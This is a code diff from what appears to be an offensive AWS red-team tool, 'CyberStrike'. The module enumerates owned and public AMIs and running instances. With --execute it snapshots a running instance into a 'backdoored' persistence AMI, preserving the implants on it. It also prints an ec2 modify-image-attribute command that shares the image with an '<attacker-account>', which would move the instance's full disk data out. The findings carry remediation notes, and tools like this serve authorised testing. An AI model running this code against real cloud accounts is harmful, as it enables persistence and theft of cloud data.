+  output.push(`[*] CloudTrail: CreateImage, ModifyImageAttribute`)
+
+  const amis = await aws(["ec2", "describe-images", "--owners", "self", "--query", "Images[].[ImageId,Name,State,Public,CreationDate]"], profile, region, timeout)
+  const al = amis.exitCode === 0 ? tryJson(amis.stdout) || [] : []
+  output.push(`\n[+] Owned AMIs: ${al.length}`)
+  const publicAmis = al.filter((a: unknown[]) => a[3])
+  if (publicAmis.length > 0) {
+    output.push(`[!] PUBLIC AMIs: ${publicAmis.length} — may contain sensitive data`)
+    for (const a of publicAmis) {
+      output.push(`  [!] ${a[0]} — ${a[1]} [PUBLIC]`)
+      findings.push({ checkId: "AWS-PERSIST-AMI-002", provider: "aws", severity: "high", status: "FAIL", resource: `ec2:ami:${a[0]}`, title: `AMI ${a[0]} is publicly shared`, details: `Public AMI "${a[1]}" — may contain secrets, keys, or implants`, remediation: `aws ec2 modify-image-attribute --image-id ${a[0]} --launch-permission "Remove=[{Group=all}]"` })
     }
-    output.push("\n[*] Use --instance-id to create backdoored AMI from running instance")
+  }
+  for (const a of al.filter((a: unknown[]) => !a[3]).slice(0, 10)) {
+    output.push(`  ${a[0]} — ${a[1]} — ${a[2]} — ${a[4]}`)
+    if (canShare) {
+      const perms = await aws(["ec2", "describe-image-attribute", "--image-id", a[0] as string, "--attribute", "launchPermission"], profile, region, timeout)
+      const lp = tryJson(perms.stdout)?.LaunchPermissions || []
+      if (lp.length > 0) {
+        const shared = lp.map((p: Record<string, string>) => p.UserId || p.Group || "unknown").join(", ")
+        output.push(`    [!] Shared with: ${shared}`)
+      }
+    }
+  }
+
+  const instances = await aws(["ec2", "describe-instances", "--filters", "Name=instance-state-name,Values=running", "--query", "Reservations[].Instances[].[InstanceId,InstanceType,State.Name,IamInstanceProfile.Arn,Tags[?Key=='Name']|[0].Value]"], profile, region, timeout)
+  const il = instances.exitCode === 0 ? tryJson(instances.stdout) || [] : []
+  output.push(`\n[+] Running Instances (snapshot targets): ${il.length}`)
+  for (const i of il.slice(0, 15)) {
+    const iamRole = i[3] ? (i[3] as string).split("/").pop() : "no-role"
+    output.push(`  ${i[0]} (${i[1]}) — ${i[4] || "unnamed"} — role: ${iamRole}`)
+  }
+
+  if (!instanceId) {
+    output.push(`\n[*] Use --instance-id <id> --execute to create backdoored AMI`)
+    if (canShare) output.push(`[*] After creation, share cross-account: aws ec2 modify-image-attribute --image-id <ami> --launch-permission "Add=[{UserId=<account>}]"`)
+    if (il.length > 0) {
+      findings.push({ checkId: "AWS-PERSIST-AMI-003", provider: "aws", severity: "high", status: "READY", resource: `ec2://${il.length}-instances`, title: `AMI backdoor viable — ${il.length} running instances available`, details: `Can snapshot any running instance into AMI preserving all data + implants${canShare ? "; cross-account sharing also possible" : ""}`, remediation: "Restrict ec2:CreateImage, ec2:ModifyImageAttribute" })
+    }
+    return { output: output.join("\n"), findings }
+  }
+
+  if (!execute) {
+    output.push(`\n[*] DRY RUN — pass --execute to create AMI from ${instanceId}`)
     return { output: output.join("\n"), findings }
   }
 
   const name = `cs-ami-${Date.now().toString(36)}`
-  const create = await aws(
-    [
-      "ec2",
-      "create-image",
-      "--instance-id",
-      instanceId,
-      "--name",
-      name,
-      "--description",
-      "CyberStrike persistence AMI",
-      "--tag-specifications",
-      "ResourceType=image,Tags=[{Key=CreatedBy,Value=CyberStrike}]",
-    ],
-    profile,
-    region,
-    timeout,
-  )
+  const create = await aws(["ec2", "create-image", "--instance-id", instanceId, "--name", name, "--description", "CyberStrike persistence AMI", "--tag-specifications", "ResourceType=image,Tags=[{Key=CreatedBy,Value=CyberStrike}]"], profile, region, timeout)
   if (create.exitCode !== 0) {
     output.push(`[-] AMI creation failed: ${create.stderr.trim()}`)
     return { output: output.join("\n"), findings }
   }
 
   const imageId = tryJson(create.stdout)?.ImageId
-  output.push(`[+] AMI created: ${imageId} from instance ${instanceId}`)
+  output.push(`\n[+] AMI created: ${imageId} from instance ${instanceId}`)
   output.push(`[*] AMI name: ${name}`)
-  output.push(`[*] Future launches from this AMI will include any implants on the source instance`)
+  output.push(`[*] Future launches preserve all disk contents including implants`)
+  if (canShare) output.push(`[+] Share: aws ec2 modify-image-attribute --image-id ${imageId} --launch-permission "Add=[{UserId=<attacker-account>}]"`)
 
-  findings.push({
-    checkId: "AWS-PERSIST-005",
-    provider: "aws",
-    severity: "high",
-    status: "CREATED",
-    resource: `ec2:ami:${imageId}`,
-    title: `Backdoored AMI created: ${imageId}`,
-    details: `AMI created from instance ${instanceId} — any implants on source are preserved`,
-    remediation: "Deregister AMI: aws ec2 deregister-image --image-id " + imageId,
-  })
+  findings.push({ checkId: "AWS-PERSIST-AMI-004", provider: "aws", severity: "critical", status: "CREATED", resource: `ec2:ami:${imageId}`, title: `Backdoored AMI created: ${imageId}`, details: `AMI from ${instanceId} — all data preserved. Cleanup: deregister + delete snapshots`, remediation: `aws ec2 deregister-image --image-id ${imageId}` })
 
   return { output: output.join("\n"), findings }
 }
